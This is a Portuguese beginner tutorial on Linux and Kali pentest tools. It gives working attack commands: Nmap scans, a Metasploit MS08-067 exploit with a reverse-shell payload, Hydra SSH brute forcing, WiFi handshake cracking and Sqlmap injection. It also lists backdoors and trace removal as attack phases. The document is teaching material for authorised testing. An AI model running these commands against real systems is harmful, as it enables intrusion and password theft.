Introdução ao Linux

Linux é um sistema operacional open source amplamente usado em servidores, desktops, dispositivos embarcados e ambientes de desenvolvimento.

Conhecer os comandos básicos, sintaxes e ferramentas do Linux é essencial para administradores de sistemas e profissionais de suporte técnico.

Flags e Sintaxes Importantes

Entender flags comuns e sintaxes facilita o uso das ferramentas. Exemplos:

  • -v: modo verbose (mais detalhado)
  • -h ou --help: ajuda
  • -r: recursivo
  • -f: força operação
  • -i: interface de rede (em ferramentas de rede)
  • -p: porta
  • -o: output (arquivo de saída)

Ferramentas Kali Linux Importantes

  • Nmap - Scanner de portas e serviços
  • Metasploit Framework - Exploração de vulnerabilidades
  • Hydra - Ataques de força bruta
  • Nikto - Scanner de vulnerabilidades web
  • Aircrack-ng - Ataques em redes WiFi
  • Sqlmap - Testes de injeção SQL
  • Wireshark - Análise de tráfego de rede
  • John the Ripper - Cracking de senhas

Exemplos Práticos de Uso Kali Linux

Nmap Avançado

Scan simples para descobrir hosts ativos:

nmap -sn 192.168.1.0/24

Scan detalhado com detecção de sistema e versão:

nmap -sS -sV -O -p 1-65535 192.168.1.100

Scan stealth (SYN scan) para portas comuns:

nmap -sS -p 22,80,443 10.0.0.5

Metasploit Framework

msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit

Comandos básicos:

  • search: procura exploits
  • use: seleciona exploit ou payload
  • show options: mostra opções configuráveis
  • set: define valores
  • exploit: executa o ataque

Hydra - Ataques de Força Bruta

hydra -l admin -P /path/dicionario.txt 192.168.1.10 ssh

Parâmetros comuns:

  • -l: usuário
  • -L: arquivo com lista de usuários
  • -p: senha única
  • -P: arquivo com lista de senhas
  • -t: número de threads

Nikto - Scanner Web

nikto -h http://192.168.1.10

Verifica vulnerabilidades, diretórios e configurações erradas em servidores web.

Aircrack-ng - Ataques WiFi

Coloque a interface wireless em modo monitor:

airmon-ng start wlan0

Capture pacotes:

airodump-ng wlan0mon

Execute ataque de captura de handshake e quebras:

aircrack-ng -w /path/dicionario.txt captura.cap

Sqlmap - Injeção SQL

sqlmap -u "http://site.com/page.php?id=1" --dbs

Lista bancos de dados da aplicação vulnerável.

Dicas e Boas Práticas

  • Sempre tenha permissão para realizar testes (pentest legal).
  • Use ambientes virtuais para testes e não em redes de produção.
  • Documente seus testes e resultados.
  • Mantenha suas ferramentas Kali atualizadas com apt update && apt upgrade.
  • Aprenda sobre redes, sistemas e segurança para complementar o uso das ferramentas.
  • Foque em entender o funcionamento dos comandos antes de rodar ataques.

Tipos de Ataques e Pentest

Os principais tipos são:

  • Reconhecimento: coleta de informações (ex: Nmap, Whois)
  • Varredura: busca por vulnerabilidades (ex: Nikto, OpenVAS)
  • Ganho de Acesso: exploração (ex: Metasploit)
  • Manutenção de Acesso: instalação de backdoors, persistência
  • Limpeza: remoção de rastros
